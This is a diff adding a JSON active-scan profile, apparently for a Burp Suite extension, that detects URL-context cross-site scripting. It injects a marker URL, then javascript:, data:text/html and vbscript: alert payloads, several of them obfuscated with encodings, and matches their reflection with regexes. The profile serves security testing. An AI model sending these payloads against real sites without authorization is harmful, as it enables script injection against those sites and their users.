@@ -1,0 +1,98 @@
+[
+  {
+    "profile_name": "XSS_URL_Context",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,http://url_xsstest1337.com"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "param_body",
+          "user_provided",
+          "param_url"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,(href|src|action|data)\\s*=\\s*(['\"]?)http:\\/\\/url_xsstest1337\\.com\\2",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "none",
+        "issue_name": "URL_Context_Detection",
+        "issue_severity": "Information",
+        "issue_confidence": "Firm",
+        "issue_detail": "Preliminary detection of URL reflection in attributes",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      },
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,javascript:alert(1)",
+          "true,javascript:%61lert(1)",
+          "true,data:text/html,<script>alert(1)</script>",
+          "true,java%0ascript:alert(1)",
+          "true,javascript://%0aalert(1)",
+          "true,javascript://comment%0Aalert(1)",
+          "true,javascript:String.fromCharCode(97,108,101,114,116,40,49,41)",
+          "true,j&#97;v&#97;script&#x3A;&#97;lert(1)",
+          "true,javascript&#58;alert(1)",
+          "true,vbscript:alert(1)"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,(href|src|action|data)\\s*=\\s*(['\"]?)(javascript:|data:text\\/html|java%0ascript:|j&#97;v&#97;script|javascript&#58;).*alert",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "always",
+        "issue_name": "URL_Context_XSS",
+        "issue_severity": "Medium",
+        "issue_confidence": "Certain",
+        "issue_detail": "User input is inserted into a URL attribute without proper validation, allowing injection of javascript: protocols that execute arbitrary code.",
+        "remediation_detail": "Validate URLs against a whitelist of allowed protocols (https:, http:). Consider using functions like URL.createObjectURL() instead of directly embedding URLs.",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "XSS",
+      "URL_Context",
+      "All"
+    ]
+  }
+]
